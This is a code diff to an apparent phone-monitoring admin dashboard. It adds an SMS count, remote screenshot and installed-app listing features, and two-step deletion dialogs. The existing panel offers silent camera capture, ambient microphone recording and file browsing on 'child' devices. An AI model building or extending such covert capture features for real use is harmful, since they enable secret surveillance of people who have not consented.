@@ -21,12 +21,14 @@ import {
   ArrowLeft, User, Mail, Calendar, Smartphone, MapPin, Bell, BarChart2,
   Wifi, WifiOff, Clock, Phone, PhoneIncoming, PhoneOutgoing, PhoneMissed,
   Contact as ContactIcon, Image, Video, Globe, Activity, Battery, Signal,
-  Camera, Mic, Radio, Monitor, FolderOpen, Shield, Eye, Trash2,
+  Camera, Mic, Radio, Monitor, AppWindow, FolderOpen, Shield, Eye, Trash2,
   ChevronDown, ChevronUp, ChevronRight, Search, MessageSquare,
 } from 'lucide-react';
 import type { LucideIcon } from 'lucide-react';
 import { adminApi } from '@/lib/adminApi';
 import PageLoader from '@/components/PageLoader';
+import { confirmDialog, stepConfirm } from '@/lib/confirm';
+import { toast } from 'sonner';
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 interface DeviceCount {
@@ -255,12 +257,13 @@ function OverviewTab({
                       </button>
                     </div>
                   </div>
-                  <div className="grid grid-cols-4 gap-2 text-xs text-center">
+                  <div className="grid grid-cols-5 gap-2 text-xs text-center">
                     {[
-                      { icon: <MapPin size={11} />, val: d._count.locationLogs, label: 'Locs' },
-                      { icon: <Phone size={11} />,  val: d._count.callLogs,     label: 'Calls' },
-                      { icon: <Bell size={11} />,   val: d._count.notificationLogs, label: 'Notifs' },
-                      { icon: <Globe size={11} />,  val: d._count.browsingHistory,  label: 'URLs' },
+                      { icon: <MapPin size={11} />,        val: d._count.locationLogs,      label: 'Locs' },
+                      { icon: <Phone size={11} />,         val: d._count.callLogs,          label: 'Calls' },
+                      { icon: <MessageSquare size={11} />, val: d._count.smsLogs ?? 0,      label: 'SMS' },
+                      { icon: <Bell size={11} />,          val: d._count.notificationLogs,  label: 'Notifs' },
+                      { icon: <Globe size={11} />,         val: d._count.browsingHistory,   label: 'URLs' },
                     ].map((s) => (
                       <div key={s.label} className="bg-gray-700/50 rounded-lg py-1.5">
                         <div className="flex justify-center text-gray-400 mb-0.5">{s.icon}</div>
@@ -1309,10 +1312,12 @@ function RemoteTab({ data, userId, selectedDeviceId, allDevices }: {
     : allDevices.filter((d) => d.role === 'child')[0] ?? null;
 
   const CARDS = [
-    { key: 'camera', label: 'Camera Capture',  desc: 'Silently capture photo from front or back camera', icon: <Camera size={22} className="text-pink-400" />,     iconBg: 'bg-pink-500/20',   border: 'hover:border-pink-700/50',   accent: 'from-pink-600 to-rose-700' },
-    { key: 'audio',  label: 'Audio Recording', desc: 'Start / stop ambient microphone recording',        icon: <Mic size={22} className="text-red-400" />,         iconBg: 'bg-red-500/20',    border: 'hover:border-red-700/50',    accent: 'from-red-600 to-orange-700' },
-    { key: 'files',  label: 'File Browsing',   desc: 'List files and folders on device storage',         icon: <FolderOpen size={22} className="text-yellow-400" />,iconBg: 'bg-yellow-500/20', border: 'hover:border-yellow-700/50', accent: 'from-yellow-600 to-amber-700' },
-    { key: 'quick',  label: 'Quick Commands',  desc: 'Lock device, block or unblock apps instantly',     icon: <Shield size={22} className="text-indigo-400" />,   iconBg: 'bg-indigo-500/20', border: 'hover:border-indigo-700/50', accent: 'from-indigo-600 to-violet-700' },
+    { key: 'camera',     label: 'Camera Capture',  desc: 'Silently capture photo from front or back camera',         icon: <Camera size={22} className="text-pink-400" />,     iconBg: 'bg-pink-500/20',    border: 'hover:border-pink-700/50',    accent: 'from-pink-600 to-rose-700' },
+    { key: 'audio',      label: 'Audio Recording', desc: 'Start / stop ambient microphone recording',               icon: <Mic size={22} className="text-red-400" />,         iconBg: 'bg-red-500/20',     border: 'hover:border-red-700/50',     accent: 'from-red-600 to-orange-700' },
+    { key: 'screenshot', label: 'Screenshot',      desc: 'Capture current screen via Accessibility Service (API 30+)', icon: <Monitor size={22} className="text-cyan-400" />,    iconBg: 'bg-cyan-500/20',    border: 'hover:border-cyan-700/50',    accent: 'from-cyan-600 to-teal-700' },
+    { key: 'files',      label: 'File Browsing',   desc: 'List files and folders on device storage',                icon: <FolderOpen size={22} className="text-yellow-400" />,iconBg: 'bg-yellow-500/20',  border: 'hover:border-yellow-700/50',  accent: 'from-yellow-600 to-amber-700' },
+    { key: 'apps',       label: 'Installed Apps',  desc: 'List all user-installed apps on the device',              icon: <AppWindow size={22} className="text-emerald-400" />,iconBg: 'bg-emerald-500/20', border: 'hover:border-emerald-700/50', accent: 'from-emerald-600 to-green-700' },
+    { key: 'quick',      label: 'Quick Commands',  desc: 'Lock device, block or unblock apps instantly',            icon: <Shield size={22} className="text-indigo-400" />,   iconBg: 'bg-indigo-500/20',  border: 'hover:border-indigo-700/50',  accent: 'from-indigo-600 to-violet-700' },
   ];
 
   if (!device) {
@@ -1407,23 +1412,59 @@ export default function UserDetailPage() {
   }, [fetchData]);
 
   const handleDeviceDelete = useCallback(async (deviceId: string, name: string) => {
-    if (!confirm(`Remove device "${name}" and ALL its data? This cannot be undone.`)) return;
+    const step1 = await confirmDialog({
+      title: `Delete data for "${name}"?`,
+      text: 'This permanently removes all locations, SMS, calls, notifications, gallery, browsing history and more for this device.',
+      confirmText: 'Yes, delete data',
+      type: 'danger', theme: 'dark',
+    });
+    if (!step1) return;
     try {
-      await adminApi.deleteDevice(deviceId);
-      // If we were viewing this device, reset to all-devices view
-      if (selectedDeviceId === deviceId) setSelectedDeviceId(null);
-      setAllDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
-      fetchData(selectedDeviceId === deviceId ? null : selectedDeviceId);
+      await adminApi.deleteDeviceData(deviceId);
+      toast.success(`All data for "${name}" deleted`);
+      const step2 = await stepConfirm({
+        title: 'Data deleted!',
+        text: `All monitoring data for "${name}" has been removed. Remove the device registration too?`,
+        confirmText: 'Yes, remove device',
+        cancelText: 'Keep device',
+        theme: 'dark',
+      });
+      if (step2) {
+        await adminApi.deleteDevice(deviceId);
+        if (selectedDeviceId === deviceId) setSelectedDeviceId(null);
+        setAllDevices((prev) => prev.filter((d) => d.deviceId !== deviceId));
+        fetchData(selectedDeviceId === deviceId ? null : selectedDeviceId);
+        toast.success(`Device "${name}" removed`);
+      } else {
+        fetchData(selectedDeviceId);
+      }
     } catch {
-      alert('Failed to remove device.');
+      toast.error(`Failed to delete data for "${name}"`);
     }
   }, [selectedDeviceId, fetchData]);
 
   const handleDelete = useCallback(async () => {
-    if (!confirm('Permanently delete this user and ALL their data? This cannot be undone.')) return;
+    const step1 = await confirmDialog({
+      title: 'Delete all user data?',
+      text: 'This permanently removes all locations, SMS, calls, notifications, gallery, browsing history, and more for this user.',
+      confirmText: 'Yes, delete data',
+      type: 'danger', theme: 'dark',
+    });
+    if (!step1) return;
     setDeleting(true);
     try {
+      await adminApi.deleteUserData(userId);
+      toast.success('All user data deleted');
+      const step2 = await stepConfirm({
+        title: 'Data deleted!',
+        text: 'All monitoring data has been removed. Delete the user account too?',
+        confirmText: 'Yes, delete account',
+        cancelText: 'Keep account',
+        theme: 'dark',
+      });
+      if (!step2) { setDeleting(false); fetchData(null); return; }
       await adminApi.deleteUser(userId);
+      toast.success('User account deleted');
       router.push('/admin/users');
     } finally {
       setDeleting(false);
